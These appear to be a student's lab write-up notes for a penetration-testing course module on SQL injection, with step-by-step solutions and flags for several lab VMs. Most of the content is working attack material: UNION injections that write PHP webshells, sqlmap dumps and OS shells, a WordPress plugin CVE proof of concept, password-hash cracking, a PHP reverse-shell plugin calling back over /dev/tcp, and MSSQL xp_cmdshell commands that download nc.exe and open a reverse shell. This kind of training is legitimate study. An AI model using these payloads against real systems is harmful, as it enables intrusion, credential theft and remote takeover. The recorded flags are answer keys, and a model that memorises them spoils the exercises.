

2. Connect to the MySQL VM 2 and repeat the steps illustrated in this section in order to manually exploit the UNION-based SQLi.
	   Once you have obtained a webshell, gather the flag that is located in the same **tmp** folder.

- Auth bypass
![](10ex_authBypass.png)

- Find # of columns
```sql
' order by 1-- -
```
![](10ex_orderby6.png)

- Insert webshell
```sql
%' union select "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"-- 
```

- Cat flag
```bash
# In URL
http://192.168.246.19/tmp/webshell.php?cmd=cat%20flag.txt
```


> Answer:  OS{42b86739388422346bc1c9f4e730d3aa}



3. Connect to the MySQL VM 3 and automate the SQL injection discovery via sqlmap as shown in this section. 
	   Then dump the _users_ table by abusing the time-based blind SQLi and find the flag that is stored in one of the table's records.

**\*\*NOTE:**  Nowhere in the app does it state/ suggest that there's a */blindsqli.php* site to navigate to.
- FURTHERMORE, */blindsqli.php* immediately redirects to *login1.php?msg=2*  which is not vulnerable.  So the "as shown in this section" is a specific, literal direction

```bash
# Warning:  takes easily over an hour
sqlmap -u http://192.168.221.19/blindsqli.php?user=u -p user -T users --dump --threads=10
```

> Answer:  OS{afe2bd417dc053792c45c5937199f396}



4. **Capstone Exercise**: Enumerate the Module Exercise - VM #1 and exploit the SQLi vulnerability in order to get the flag.
	   Hint: To enhance the attack efficiency, it's recommended to manually identify the injection point before deploying any automated tool
		someone's write-up:   https://medium.com/@mhwee/sqli-in-wp-perfect-survey-plugin-f5823379317a

- Enumerating yielded nothing special
```bash
nmap -Pn 192.168.221.47
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http

gobuster dir -u http://192.168.221.47 -w /usr/share/wordlists/dirb/common.txt
	/css                  (Status: 301) [Size: 314] [--> http://192.168.221.47/css/]
	/images               (Status: 301) [Size: 317] [--> http://192.168.221.47/images/]
	/index.html           (Status: 200) [Size: 15405]
	/js                   (Status: 301) [Size: 313] [--> http://192.168.221.47/js/]
```

- Browsing to site turns up site hxxp://alvida-eatery.org/ which only displays malware/ phishing page.
- **[Virtual hosting](https://www.youtube.com/watch?v=NMGsnPSm8iw&t=120s) is in play here** Fix by adding to **/etc/hosts**
```bash
sudo vim /etc/hosts
	#add
	192.168.221.47  alvida-eatery.org
```

- Wappalyzer shows use of WordPress
- Search for vuln plugins/ admin consoles (lots of results w/ API)
```bash
wpscan --url alvida-eatery.org --enumerate p --api-token <token> > wpscn
	[+] Upload directory has listing enabled: http://alvida-eatery.org/wp-content/uploads/
	...
	[+] perfect-survey
	 | Location: http://alvida-eatery.org/wp-content/plugins/perfect-survey/
	 | [!] Title: Perfect Survey < 1.5.2 - Unauthenticated SQL Injection
	 |     Fixed in: 1.5.2
	 |     References:
	 |      - https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24762
	 ...
```

- Use POC in wpscan.com site shown in results, OR search for CVE in ExploitDB  https://www.exploit-db.com/exploits/50766
```bash
# POC
http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
```

- JSON file will come back w/in the browser.   Search for $  and save hash in file
```bash
vim pw
	# Insert
	$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
```

- Run [hashcat](Tools.md#hashcat)
```bash
hashcat -m 400 -a 0 -O pw /usr/share/wordlists/rockyou.txt
	$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0:hulabaloo
```

- Navigate to hxxp://alvida-eatery.org/wp-admin and login w/ **admin:hulabaloo** creds.
- Goto Plugins
- Craft reverse shell plugin
```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

# Edit IP and port below to match nc listener on local
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/4444 0>&1'");
?>
```
- Zip & start nc listener
```bash
zip reverse.zip reverse_shell.php
nc -nlvp 4444
```
- Add New Plugin & Activate
	- Should have reverse connection in listener
- Search directories
```bash
www-data@Alvida:/var/www/wordpress/wp-admin$ ls ../../
	ls ../../
	flag.txt
	html
	wordpress
www-data@Alvida:/var/www/wordpress/wp-admin$ cat ../../flag.txt
	cat ../../flag.txt
	OS{50721ad4f7d57b37a360790ac19f7412}
```


> Answer:  OS{50721ad4f7d57b37a360790ac19f7412}



5. **Capstone Exercise**: Enumerate the Module Exercise - VM #2 and exploit the SQLi vulnerability in order to get the flag.

- Enumerate
```bash
nmap -Pn 192.168.209.48
	PORT      STATE    SERVICE
	22/tcp    open     ssh
	80/tcp    open     http
	1124/tcp  filtered hpvmmcontrol
	1186/tcp  filtered mysql-cluster
	2909/tcp  filtered funk-dialout
	3077/tcp  filtered orbix-loc-ssl
	3268/tcp  filtered globalcatLDAP
	3301/tcp  filtered tarantool
	3306/tcp  open     mysql
	3703/tcp  filtered adobeserver-3
	4444/tcp  filtered krb524
	6059/tcp  filtered X11:59
	9594/tcp  filtered msgsys
	13783/tcp filtered netbackup
	14238/tcp filtered unknown
	22939/tcp filtered unknown
	27352/tcp filtered unknown
	30951/tcp filtered unknown
	44443/tcp filtered coldfusion-auth
	50006/tcp filtered unknown
```
- **Wappalyzer**, **Gobuster**, **feroxbuster**, and **dirsearch** didn't yield any juicy results

- Browsing through the site gave three total pages:  **index.php**, **about.php**, and **donate.php**
	- So, they use PHP.
	- Found a Subscribe "Enter your email" field on **index.php** which generates a POST request
	![](10.3.2.5ex_emailPost.png)

##### Manual
- Send POST request to Repeater, and SEND original for comparisons
- Note line number for    \<!-- end subscribe section --\>    (319) - Makes it easier to find what you're looking for
- Run ***order by # --***  attempts and scour Response's Subscription section for any column number errors
	- IGNORE NUMBER IN IMAGE!    Correct # of columns is **6**
  ![](10.3.2.5ex_orderby.png)
  - Attempt writing shell via INTO OUTFILE
	  - Might need to troubleshoot to figure where to save the webshell
```sql
UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php"-- //
```

- Navigate to webshell and trigger exploit
```bash
http://192.168.209.48/webshell.php?cmd=find%20/%20-name%20flag.txt%20|%20grep%20flag.txt
	\N /var/www/flag.txt \N \N \N \N
http://192.168.209.48/webshell.php?cmd=cat%20/var/www/flag.txt
```

##### Automatic w/ sqlmap
- Save original, clean POST request to **subscribe_POST.txt**
- Get shell in **sqlmap**
```bash
sqlmap -r subscribe_POST.txt -p mail-list --os-shell
	...
	os-shell> find / -name flag.txt | grep flag.txt
		do you want to retrieve the command standard output? [Y/n/a] 
	Y
		command standard output: '/var/www/flag.txt'
	os-shell> cat /var/www/flag.txt
```


> Answer:  OS{ddb87012b9a6c37dff575a5b8ae36d5e}



6. **Capstone Exercise**: Enumerate the Module Exercise - VM #3 and exploit the SQLi vulnerability in order to get the flag.

```bash
nmap -Pn 192.168.209.49
	PORT     STATE SERVICE
	22/tcp   open  ssh
	80/tcp   open  http
	5432/tcp open  postgresql

feroxbuster -u http://192.168.209.49 -s 200 -s 301
200      GET      245l     1051w    14484c http://192.168.209.49/blog.php
200      GET      272l     1105w    15794c http://192.168.209.49/about.php
301      GET        9l       28w      315c http://192.168.209.49/mail => http://192.168.209.49/mail/
301      GET        9l       28w      314c http://192.168.209.49/img => http://192.168.209.49/img/
200      GET       65l      166w     2598c http://192.168.209.49/mail/contact.js
200      GET      192l      682w    10573c http://192.168.209.49/contact.php
200      GET      783l     2739w    46446c http://192.168.209.49/index.php
200      GET      268l     1017w    15171c http://192.168.209.49/feature.php
200      GET      488l     1382w    27598c http://192.168.209.49/class.php
```

- Browsing shows **class.php** and **contact.php** have form fields.
- Send their POST requests to Repeater 371-422 71-126 and test each parameter
	![](10.3.2.6ex_class.png)

- Given the error message (& a bit of googling), **order by** won't work.
- Test with **union select** & null entries to find column numbers
  ![](10ex_unionColumnTest.png)

- Attempt webshell via INTO OUTFILE
```sql
UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php"-- //

	-- Throws error
	:  pg_query(): Query failed: ERROR:  syntax error at or near &quot;&quot;/var/www/html/webshell.php&quot;&quot;
	LINE 1: ...['cmd']);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/...
	 ^ in <b>/var/www/html/class.php
```
- URL encoding doesn't work

Considering the db is PostgresSQL, consulted [PayloadsAllTheThings PostgresSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) section for payloads.
- Eventually figured this out to return the password
- Need to cast the passwd to convert to type int (doesn't need '+'.  Space should work fine)
![](10.3.2.6ex_pw.png)
- Grab user name
```sql
union select null, null, cast(user as int), null, null, null from pg_shadow-- //
	-- rubben
```
- Grab database
```sql
union select null, null, cast(SELECT current_database() as int), null, null, null-- //
	-- glovedb
```

- Crack password (avrillavigne)
```bash
# hashcat
echo ae8c67affdb169a42c9631c02fc67ede > pw
hashcat -m 0 -w 1 pw

# john
echo rubben:ae8c67affdb169a42c9631c02fc67ede > pw
john --format=raw-md5 pw
```
- If having issues cracking, can try passing the hash directly as the pw

- Login
```bash
psql -h 192.168.226.49 -p 5432 -U rubben -d glovedb
	# it'll ask for password
```

- Use Pentestmonkey's [**cmd_exec**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution) for flag (NOTE: flag will be different from original answer as I manually did it on a fresh VM)
![](10.3.2.6_flag.png)


> Answer:  OS{7076206eced8864d3637266b1da6d96c}



7. **Capstone Exercise**: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability in order to get the flag.

- Enumerate & browse
```bash
nmap -Pn 192.168.226.50
	PORT    STATE SERVICE
	80/tcp  open  http
	135/tcp open  msrpc
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

ferroxbuster -u http://192.168.226.50 -s 200
	200      GET      194l      500w     8586c http://192.168.226.50/about.aspx
	200      GET      198l      531w     8918c http://192.168.226.50/doctors.aspx
	200      GET      202l      522w     9030c http://192.168.226.50/protect.aspx
	200      GET      231l      791w    11767c http://192.168.226.50/news.aspx
	200      GET       93l      256w     4140c http://192.168.226.50/login.aspx    <-- Note

# Wappalyzer - ASP.NET 4.0.30319 on Windows Server ISS 10.0
```

- Navigate to **login.aspx** and enter form fields (all other sites are moot)
- Send to Burp Repeater & test for columns & vuln parameter
	![](10.3.2.7ex_orderBy.png)
		- UsernameTextBox is vuln w/ 2 columns

```sql
-- Test for vuln param
'; WAITFOR delay '0:0:10';-- 

'-- Find out dbs version to find possible vulns
-- Not working, not sure how to find possible vuln avenues - '; IF(CHARINDEX('15.0.',@@VERSION)>0) WAITFOR DELAY '0:0:15'--

'-- Copy Window's nc.exe to folder and create web server
cp /usr/share/windows-resources/binaries/nc.exe ~/exercises/web 
python -m http.server 80

''-- Configure xp_cmdshell to work
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--

-- Download nc.exe to target maching & run
';EXEC xp_cmdshell "certutil -urlcache -f http://<kali_ip>/nc.exe c:/windows/temp/nc.exe";-- '
';EXEC xp_cmdshell "c:/windows/temp/nc.exe <kali_ip> 4444 -e cmd.exe";--
```

```sql
-- Encoded
%27%3B%20WAITFOR%20delay%20%270%3A0%3A10%27%3B%20EXEC%20sp_configure%20%22show%20advanced%20options%22%2C1%3B%20RECONFIGURE%3B%20EXEC%20sp_configure%20%22xp_cmdshell%22%2C1%3B%20RECONFIGURE%3B%20EXEC%20xp_cmdshell%20%22certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.45.211%2Fnc.exe%20c%3A%2Fwindows%2Ftemp%2Fnc.exe%22%3B%20EXEC%20xp_cmdshell%20%22c%3A%2Fwindows%2Ftemp%2Fnc.exe%20-c%20192.168.45.211%20-p%204444%20-e%20cmd.exe%22%3B--%20%2F%2F
```

- In nc listener
```powershell
cd C:\
dir /s flag.txt
type C:\inetpub\wwwroot\flag.txt
```

> Answer:  OS{67ca0eacbdb181c024335575a90602c1}